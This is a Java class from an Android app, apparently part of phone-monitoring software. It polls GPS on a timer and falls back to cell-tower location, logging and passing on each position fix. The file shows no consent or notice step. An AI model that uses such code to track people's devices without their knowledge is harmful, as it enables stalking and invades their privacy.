package com.vvt.location;

import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import com.fx.maind.ref.Customization;
import com.vvt.location.CellLocationToLocation.ConversionException;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkUtil;

public final class GpsTracking implements LocationListenerManager.Callback {
	
	private static final String TAG = "GpsTracking";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static GpsTracking sInstance;
	
	private boolean mIsEnabled = false;
	private int mTimeInterval = 3600; // seconds
	
	private Context mContext;
	private LocationListenerManager mLocationListenerManager;
	private LocationManager mLocationManager;
	
	private OnCaptureListener mListener;
	
	private Timer mRequestLocationTimer;
	private TimerTask mRequestLocationTask;
	
	private Timer mTimeoutTimer;
	private TimerTask mTimeoutTask;

	public static GpsTracking getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new GpsTracking(context);
		}
		return sInstance;
	}
	
	private GpsTracking(Context context) {
		mContext = context;
		mLocationManager = (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
	}
	
	public void enable(OnCaptureListener listener, int timeInterval) {
		FxLog.d(TAG, String.format("enable # timeInterval: %d", timeInterval));
		
		if (! mIsEnabled) {
			mIsEnabled = true;
			mListener = listener;
			mTimeInterval = timeInterval;
			
	    	if (LOGV) FxLog.v(TAG, "enable # Waiting for location ...[x]");
	    	requestLocation();
		}
	}
	
	public void disable() {
		FxLog.d(TAG, "disable # ENTER ...");
		
		if (mIsEnabled) {
			mIsEnabled = false;
			
			unregisterLocationListener();
			cancelTimeoutTask();
			
			if (mRequestLocationTask != null) {
				mRequestLocationTask.cancel();
				mRequestLocationTask = null;
			}
		}
	}
	
	@Override
	public void onLocationChanged(Location location) {
		if (LOGV) FxLog.v(TAG, "onLocationChanged # ENTER ...");
		
		// Unregister location listener
		unregisterLocationListener();
		
		// Cancel timeout task
		cancelTimeoutTask();
		
		// Schedule for next request location listener
		scheduleRequestLocationTask();
		
		// Capture location
		captureLocation(location);
	}
	
	private void requestLocation() {
		if (LOGV) {
			FxLog.v(TAG, "requestLocation # ENTER ...");
		}
		
		if (mLocationManager.getProviders(true).size() > 0) {
			// Register location listener
			registerLocationListener();
			
			// Schedule time out task
			scheduleTimeoutTask();
		}
		else {
			// Schedule for next request location listener
			scheduleRequestLocationTask();
			
			// Capture location finding by Google
			captureLocation(findGoogleLocation());
		}
	}
	
	private void registerLocationListener() {
		if (LOGV) {
			FxLog.v(TAG, "registerLocationListener # ENTER ...");
		}
		if (mLocationListenerManager == null) {
			mLocationListenerManager = new LocationListenerManager(mContext, this);
		}
		mLocationListenerManager.register();
	}
	
	private void unregisterLocationListener() {
		if (LOGV) {
			FxLog.v(TAG, "unregisterLocationListener # ENTER ...");
		}
		if (mLocationListenerManager != null) {
			mLocationListenerManager.unregister();
			mLocationListenerManager = null;
		}
	}
	
	private void scheduleTimeoutTask() {
		if (LOGV) {
			FxLog.v(TAG, "scheduleTimeoutTask # ENTER ...");
		}
		// Task delay
		long delay = mTimeInterval * 1000;
		if (LOGV) {
			FxLog.v(TAG, String.format("scheduleTimeoutTask # delay: %d", delay));
		}
		
		// Timeout task
		mTimeoutTask = new TimerTask() {
			@Override
			public void run() {
				if (LOGV) {
					FxLog.v(TAG, "scheduleTimeoutTask.run # ENTER ...");
				}
				startTimeoutTask();
			}
		};
		
		// Timeout timer
		if (mTimeoutTimer == null) {
			mTimeoutTimer = new Timer();
		}
		mTimeoutTimer.schedule(mTimeoutTask, delay);
	}
	
	private void scheduleRequestLocationTask() {
		if (LOGV) {
			FxLog.v(TAG, "scheduleRequestLocationTask # ENTER ...");
		}
		// Task delay
		long delay = mTimeInterval * 1000;
		FxLog.d(TAG, String.format("scheduleRequestLocationTask # delay: %d", delay));
		
		// Request location task
		mRequestLocationTask = new TimerTask() {
			@Override
			public void run() {
				if (LOGV) {
					FxLog.v(TAG, "mRequestLocationTask.run # ENTER ...");
				}
				requestLocation();
			}
		};
		
		// Request location Timer
		if (mRequestLocationTimer == null) {
			mRequestLocationTimer = new Timer();
		}
		mRequestLocationTimer.schedule(mRequestLocationTask, delay);
	}
	
	private void startTimeoutTask() {
		if (LOGV) {
			FxLog.v(TAG, "startTimeoutTask # GPS REQUEST TIMEOUT!!!");
		}
		
		// Unregister location listener
		unregisterLocationListener();
		
		// Schedule for next request location listener
		scheduleRequestLocationTask();
		
		// Request location from Google service
		captureLocation(findGoogleLocation());
	}
	
	private void cancelTimeoutTask() {
		if (LOGV) {
			FxLog.v(TAG, "cancelTimeoutTask # ENTER ...");
		}
		if (mTimeoutTask != null) {
			mTimeoutTask.cancel();
			mTimeoutTask = null;
		}
	}
	
	private void captureLocation(Location location) {
		if (location == null) {
			if (LOGV) FxLog.v(TAG, "captureLocation # Location is NULL!! Ignore capturing");
			return;
		}
		
		if (mListener != null) {
			mListener.onCapture(location);
		}
		
		if (LOGV) {
			FxLog.v(TAG, String.format(
					"captureLocation # provider: %s, lat: %f, long: %f, acc: %f", 
					location.getProvider(), location.getLatitude(), 
					location.getLongitude(), location.getAccuracy()));
		}

	}
	
	private Location findGoogleLocation() {
		if (LOGV) {
			FxLog.v(TAG, "findGoogleLocation # ENTER ...");
		}
		
		boolean hasInternet = NetworkUtil.hasInternetConnection(mContext);
		
		if (!hasInternet) {
			FxLog.d(TAG, "findGoogleLocation # No Internet connection -> return null");
			return null;
		}
		
		Location location = null;
		try {
			CellLocationToLocation cellLocationToLocation = 
				CellLocationToLocation.getInstance(mContext);
			
			location = cellLocationToLocation.getLocationOfCurrentCellLocation();
		} 
		catch (ConversionException e) {
			// Do nothing
		}
		
		return location;
	}
	
	public static interface OnCaptureListener {
		public void onCapture(Location location);
	}
}
